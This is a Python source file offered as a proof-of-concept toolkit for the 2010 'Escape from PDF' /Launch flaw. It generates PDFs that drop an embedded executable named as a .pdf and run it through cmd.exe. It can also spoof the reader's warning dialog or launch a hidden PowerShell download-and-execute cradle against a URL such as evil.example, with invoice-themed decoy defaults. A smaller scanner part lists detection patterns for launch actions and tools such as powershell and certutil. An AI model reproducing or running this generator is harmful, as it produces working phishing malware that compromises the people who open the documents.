#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
pdf-escape.py -- CVE-2010-1239 / CVE-2010-1240 ("Escape from PDF") PoC toolkit

Generates a PDF that executes a program via the /Launch action. Foxit Reader
< 3.2.1.0401 runs it with NO prompt; patched readers still run it behind a
warning dialog whose File: field is attacker-controlled.

Modes
  embed     embed an EXE in the PDF (named <name>.pdf), export it via
            exportDataObject(), then execute it (default when --exe is used)
  local     /Launch an arbitrary local program + args, nothing embedded
  download  /Launch a PowerShell download cradle (no embedded file, no JS)
  nojs      like embed but the launch is the OpenAction itself, no JavaScript

Also ships a scanner:  ./pdf-escape.py --scan suspicious.pdf

Author: Venice. Technique: Didier Stevens (2010). Stdlib only, Python 3.8+.
"""

from __future__ import annotations

import argparse
import hashlib
import os
import re
import secrets
import sys
import zlib

# ---------------------------------------------------------------- primitives

def pdfstr(s: str) -> bytes:
    """Encode a Python string as a PDF literal string, escaped."""
    out = []
    for ch in s:
        if ch in "()\\":
            out.append("\\" + ch)
        elif ch == "\n":
            out.append("\\n")
        elif ch == "\r":
            out.append("\\r")
        else:
            out.append(ch)
    return ("(" + "".join(out) + ")").encode("latin-1", "replace")


def hexkey(s: str) -> bytes:
    """UTF-16BE hex string, for the /Names key."""
    return b"<FEFF" + s.encode("utf-16-be").hex().upper().encode() + b">"


def deflate(data: bytes) -> bytes:
    c = zlib.compressobj(9, zlib.DEFLATED, -15)
    return c.compress(data) + c.flush()


def sanitize_msg(msg: str) -> str:
    """Parentheses inside /P would break cmd's block parsing."""
    return msg.replace("(", "[").replace(")", "]").replace("\r\n", "\n")


# ------------------------------------------------------------- cmdline build

PROBE_DIRS = [
    "Desktop",
    "My Documents",
    "Documents",
    "Escritorio",
    "Mis Documentos",
    "Downloads",
    "AppData\\Local\\Temp",
]

def build_script(stem: str, message: str, extra_dirs=()) -> str:
    """
    Build the /P argument. Probes every plausible export location, cd's into
    the first that holds the dropped file, then executes it. The trailing
    newline block is what the Launch dialog renders in its File: field.
    """
    parts = ["/Q /C", "%HOMEDRIVE%&cd %HOMEPATH%"]

    for d in list(PROBE_DIRS) + list(extra_dirs):
        target = f"{d}\\{stem}.pdf"
        parts.append(f'&(if exist "{target}" (cd "{d}"))')

    for env in ("%TEMP%", "%USERPROFILE%\\Downloads", "%APPDATA%\\Local\\Temp"):
        target = f"{env}\\{stem}.pdf"
        parts.append(f'&(if exist "{target}" (cd "{env}"))')

    parts.append(f"&(start {stem}.pdf)")

    script = "".join(parts)
    if message:
        script += "\n" * 10 + sanitize_msg(message)
    script += ")"
    return script


# ---------------------------------------------------------------- PDF writer

class PDF:
    def __init__(self) -> None:
        self.objs: dict[int, bytes] = {}
        self._n = 1

    def add(self, body: bytes) -> int:
        n = self._n
        self._n += 1
        self.objs[n] = body
        return n

    def render(self, root: int) -> bytes:
        out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
        offsets: dict[int, int] = {}
        for n in sorted(self.objs):
            offsets[n] = len(out)
            out += f"{n} 0 obj\n".encode() + self.objs[n] + b"\nendobj\n"

        size = max(self.objs) + 1
        xref_at = len(out)
        out += f"xref\n0 {size}\n".encode()
        out += b"0000000000 65535 f \n"
        for n in range(1, size):
            if n in offsets:
                out += f"{offsets[n]:010d} 00000 n \n".encode()
            else:
                out += b"0000000000 65535 f \n"
        out += (
            f"trailer\n<< /Size {size} /Root {root} 0 R >>\n"
            f"startxref\n{xref_at}\n%%EOF\n"
        ).encode()
        return bytes(out)


def build_pdf(*, mode: str, stem: str, payload: bytes | None, exe_name: str,
              local_path: str, local_args: str, url: str,
              message: str, decoy: str, title: str) -> bytes:
    pdf = PDF()

    # forward declarations
    cat = pdf.add(b"")          # 1
    pages = pdf.add(b"")        # 2
    page = pdf.add(b"")         # 3

    # decoy body text
    lines = [decoy[i:i + 78] for i in range(0, len(decoy), 78)] or [""]
    ops = ["BT", "/F1 13 Tf", "72 720 Td", "16 TL"]
    for ln in lines:
        ops.append(pdfstr(ln).decode("latin-1") + " Tj T*")
    ops.append("ET")
    content = "\n".join(ops).encode("latin-1")
    content_obj = pdf.add(
        f"<< /Length {len(content)} >>\nstream\n".encode() + content + b"\nendstream"
    )
    font = pdf.add(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")

    page_body = (
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Resources << /Font << /F1 " + str(font).encode() + b" 0 R >> >> "
        b"/Contents " + str(content_obj).encode() + b" 0 R >>"
    )
    pdf.objs[page] = page_body
    pdf.objs[pages] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"

    launch_dict = b""

    # ---- launch action -------------------------------------------------
    if mode == "embed":
        script = build_script(stem, message)
        launch = (
            b"<< /Type /Action /S /Launch /Win << /F " + pdfstr("cmd.exe")
            + b" /D " + pdfstr(r"c:\windows\system32")
            + b" /P " + pdfstr(script) + b" >> >>"
        )
        launch_obj = pdf.add(launch)

        # embedded file (PE bytes, .pdf name)
        comp = deflate(payload)
        checksum = hashlib.md5(comp).hexdigest().upper()
        stream_obj = pdf.add(
            b"<< /Type /EmbeddedFile /Subtype /application#2Fpdf "
            + f"/Length {len(comp)} /Filter /FlateDecode /DL {len(payload)} ".encode()
            + f"/Params << /Size {len(payload)} /CheckSum <{checksum}> >> >>\nstream\n".encode()
            + comp + b"\nendstream"
        )
        fname = f"{stem}.pdf"
        filespec = pdf.add(
            b"<< /Type /Filespec /UF " + pdfstr(fname) + b" /F " + pdfstr(fname)
            + b" /Desc " + pdfstr(exe_name)
            + b" /EF << /F " + str(stream_obj).encode() + b" 0 R >> >>"
        )
        names = pdf.add(
            b"<< /Names [ " + hexkey(stem) + b" " + str(filespec).encode() + b" 0 R ] >>"
        )

        js = (
            b"<< /Type /Action /S /JavaScript /JS "
            + pdfstr(f'this.exportDataObject({{ cName: "{stem}", nLaunch: 0 }});')
            + b" /Next " + str(launch_obj).encode() + b" 0 R >>"
        )
        js_obj = pdf.add(js)
        openaction = str(js_obj).encode()

        pdf.objs[cat] = (
            b"<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles "
            + str(names).encode() + b" 0 R >> /OpenAction " + openaction + b" 0 R >>"
        )

    elif mode == "nojs":
        # no embedded file: launch a path that must already sit beside the PDF
        script = build_script(stem, message)
        launch = (
            b"<< /Type /Action /S /Launch /Win << /F " + pdfstr("cmd.exe")
            + b" /D " + pdfstr(r"c:\windows\system32")
            + b" /P " + pdfstr(script) + b" >> >>"
        )
        launch_obj = pdf.add(launch)
        pdf.objs[cat] = (
            b"<< /Type /Catalog /Pages 2 0 R /OpenAction "
            + str(launch_obj).encode() + b" 0 R >>"
        )

    elif mode == "local":
        path = local_path
        d = os.path.dirname(path) or r"c:\windows\system32"
        f = os.path.basename(path)
        args = local_args
        if message:
            args = (args + "\n" * 10 + sanitize_msg(message)).strip("\n")
        launch = (
            b"<< /Type /Action /S /Launch /Win << /F " + pdfstr(f)
            + b" /D " + pdfstr(d)
            + (b" /P " + pdfstr(args) if args else b"") + b" >> >>"
        )
        launch_obj = pdf.add(launch)
        pdf.objs[cat] = (
            b"<< /Type /Catalog /Pages 2 0 R /OpenAction "
            + str(launch_obj).encode() + b" 0 R >>"
        )

    elif mode == "download":
        cradle = (
            'powershell -NoP -NonI -W Hidden -Exec Bypass -Command '
            f'"IEX(New-Object Net.WebClient).DownloadString(\'{url}\')"'
        )
        script = "/Q /C " + cradle
        if message:
            script += "\n" * 10 + sanitize_msg(message)
        script += ")"
        launch = (
            b"<< /Type /Action /S /Launch /Win << /F " + pdfstr("cmd.exe")
            + b" /D " + pdfstr(r"c:\windows\system32")
            + b" /P " + pdfstr(script) + b" >> >>"
        )
        launch_obj = pdf.add(launch)
        pdf.objs[cat] = (
            b"<< /Type /Catalog /Pages 2 0 R /OpenAction "
            + str(launch_obj).encode() + b" 0 R >>"
        )

    info = pdf.add(b"<< /Title " + pdfstr(title) + b" /Producer " + pdfstr("pdf-escape") + b" >>")
    data = pdf.render(root=cat)

    # splice /Info into the trailer
    return data.replace(b"/Root 1 0 R >>", b"/Root 1 0 R /Info " + str(info).encode() + b" 0 R >>")


# ------------------------------------------------------------------- scanner

PATTERNS = {
    "launch action":   rb"/S\s*/Launch|/Launch\b",
    "javascript":      rb"/S\s*/JavaScript|/JS\b",
    "embedded files":  rb"/EmbeddedFiles\b",
    "embedded stream": rb"/EF\s*<<|/Type\s*/EmbeddedFile",
    "open action":     rb"/OpenAction\b",
    "exportDataObject":rb"exportDataObject",
    "pe under pdf ext":rb"\.pdf\)\s*/Desc|application#2Fpdf",
    "lolbin":          rb"powershell|mshta|rundll32|regsvr32|certutil|wscript",
    "url":             rb"https?://[^\s\)>]{6,120}",
}


def streams(data: bytes):
    """Yield decoded stream bodies (raw + Flate)."""
    for m in re.finditer(rb"stream\r?\n", data):
        end = data.find(b"endstream", m.end())
        if end < 0:
            continue
        body = data[m.end():end].rstrip(b"\r\n")
        yield body
        try:
            yield zlib.decompress(body)
        except zlib.error:
            try:
                yield zlib.decompressobj(-15).decompress(body)
            except zlib.error:
                pass


def scan(path: str) -> int:
    data = open(path, "rb").read()
    haystacks = [data] + list(streams(data))

    print(f"[*] {path}  ({len(data)} bytes, {len(haystacks) - 1} decodable streams)")

    if not data.startswith(b"%PDF"):
        print("[!] no %PDF header")
        return 1

    hits = {}
    for label, pat in PATTERNS.items():
        found = set()
        for h in haystacks:
            for m in re.finditer(pat, h, re.I):
                found.add(m.group(0)[:120])
        if found:
            hits[label] = found

    if not hits:
        print("[-] no /Launch, no JS, no embedded files -- inert")
        return 0

    for label, found in hits.items():
        print(f"[+] {label}")
        for f in sorted(found):
            print(f"      {f.decode('latin-1', 'replace')}")

    verdict = 0
    if "launch action" in hits:
        verdict += 3
    if "embedded files" in hits or "embedded stream" in hits:
        verdict += 2
    if "exportDataObject" in hits:
        verdict += 1

    print("\n[=] verdict:", "CRITICAL - will execute code" if verdict >= 4 else
          "HIGH - executes code" if verdict >= 3 else "MEDIUM - inspect manually")
    return 0


# ---------------------------------------------------------------------- main

EPILOG = """
examples:
  # audit a suspicious PDF
  ./pdf-escape.py --scan invoice.pdf

  # embed and run a PE, spoofed dialog text, save as invoice.pdf
  ./pdf-escape.py --exe beacon.exe --out invoice.pdf \\
      --message "C:\\\\Users\\\\you\\\\Documents\\\\invoice.pdf -- verified signature"

  # CVE-2010-1239 half #1 only: run a local program, no JS, no embedded file
  ./pdf-escape.py --mode nojs --local 'C:\\\\Windows\\\\System32\\\\calc.exe'

  # no embedded file at all: PowerShell cradle
  ./pdf-escape.py --mode download --url https://evil.example/s.ps1
"""


def main() -> int:
    ap = argparse.ArgumentParser(
        prog="pdf-escape.py",
        description="CVE-2010-1239 / CVE-2010-1240 PDF /Launch PoC generator",
        epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--scan", metavar="PDF", help="scan an existing PDF and exit")
    ap.add_argument("--exe", help="PE file to embed and execute")
    ap.add_argument("--mode", choices=["embed", "local", "download", "nojs"],
                    help="default: embed if --exe given, else local")
    ap.add_argument("--local", help="local program path for --mode local/nojs")
    ap.add_argument("--args", default="", help="arguments for --local")
    ap.add_argument("--url", default="https://example.invalid/payload.ps1",
                    help="script URL for --mode download")
    ap.add_argument("--name", default="invoice",
                    help="embedded file stem (dropped as <name>.pdf), default invoice")
    ap.add_argument("--out", default="evil.pdf", help="output PDF, default evil.pdf")
    ap.add_argument("--message", default="",
                    help="text injected into the Launch dialog File: field")
    ap.add_argument("--decoy", default="This document is protected. Please wait "
                                       "while the security layer verifies the file.",
                    help="body text shown on the page")
    ap.add_argument("--title", default="Document", help="PDF /Title")
    ap.add_argument("--print-script", action="store_true",
                    help="dump the generated cmd.exe command line")
    args = ap.parse_args()

    if args.scan:
        return scan(args.scan)

    mode = args.mode
    if not mode:
        mode = "embed" if args.exe else "local"

    if mode in ("embed", "nojs") and not args.exe:
        print("[!] mode needs --exe", file=sys.stderr)
        return 2
    if mode == "local" and not args.local:
        args.local = r"C:\Windows\System32\calc.exe"

    payload = None
    if args.exe:
        payload = open(args.exe, "rb").read()
        if not payload.startswith(b"MZ"):
            print("[!] warning: not a PE (no MZ header)", file=sys.stderr)

    stem = re.sub(r"[^A-Za-z0-9_.-]", "_", args.name) or "invoice"

    if args.print_script and mode in ("embed", "nojs"):
        print(build_script(stem, args.message))
        return 0

    data = build_pdf(
        mode=mode, stem=stem, payload=payload,
        exe_name=os.path.basename(args.exe) if args.exe else "",
        local_path=args.local, local_args=args.args, url=args.url,
        message=args.message, decoy=args.decoy, title=args.title,
    )
    open(args.out, "wb").write(data)

    print(f"[+] wrote {args.out}  ({len(data)} bytes, mode={mode})")
    if payload:
        print(f"[+] embedded {args.exe} as {stem}.pdf  ({len(payload)} bytes)")
    print("[*] self-check:")
    scan(args.out)
    return 0


if __name__ == "__main__":
    sys.exit(main())